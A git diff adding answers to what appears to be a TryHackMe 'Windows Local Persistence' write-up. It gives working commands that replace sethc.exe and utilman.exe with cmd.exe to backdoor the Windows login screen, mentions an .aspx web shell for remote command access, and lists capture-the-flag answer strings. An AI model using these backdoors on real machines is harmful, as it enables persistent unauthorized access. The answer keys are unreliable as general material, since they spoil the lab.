@@ -1,4 +1,5 @@
 # Windows Local Persistence
+Disclaimer: this is one of the coolest rooms ever
 
 ### Tampering With Unprivileged Accounts
 - Insert flag1 here<br />
@@ -127,9 +128,24 @@ Now again open a nc lister, log out and log in again:<br />
 `THM{USER_TRIGGERED_PERSISTENCE_FTW}`
 ### Backdooring the Login Screen / RDP
 - Insert flag14 here<br />
+Open cmd and run `takeown /f c:\Windows\System32\sethc.exe` and `icacls C:\Windows\System32\sethc.exe /grant Administrator:F` to take ownership of this file and to be able to modify it. Now replace it with a copy of cmd.exe: `copy c:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe`<br />
+Now lock the screen and press `SHIFT` five times:<br />
+![image](https://github.com/user-attachments/assets/b2370e88-555d-4eba-b0e4-18709bf05c5a)<br />
+`THM{BREAKING_THROUGH_LOGIN}` This is so freaking cool
+
 - Insert flag15 here<br />
+To replace utilman.exe, we do a similar process to what we did with sethc.exe
+
+      takeown /f c:\Windows\System32\utilman.exe
+      icacls C:\Windows\System32\utilman.exe /grant Administrator:F
+      copy c:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
+Now lock the screen again, and press the Utilman button: <br />
+![image](https://github.com/user-attachments/assets/8feb634f-842d-4c86-b4c7-220a43836c0c)<br />
+`THM{THE_LOGIN_SCREEN_IS_MERELY_A_SUGGESTION}`
 
 ### Persisting Through Existing Services
 - Insert flag16 here<br />
+Follow the steps provided in the task, until you have the .aspx file inside C:\inetpub\wwwroot. Then visit the the webserver at `http://10.10.21.226/shell.aspx` to get a remote cmd; flag is `THM{EZ_WEB_PERSISTENCE}`
 - Insert flag17 here<br />
+I'm sorry I have to go 
 
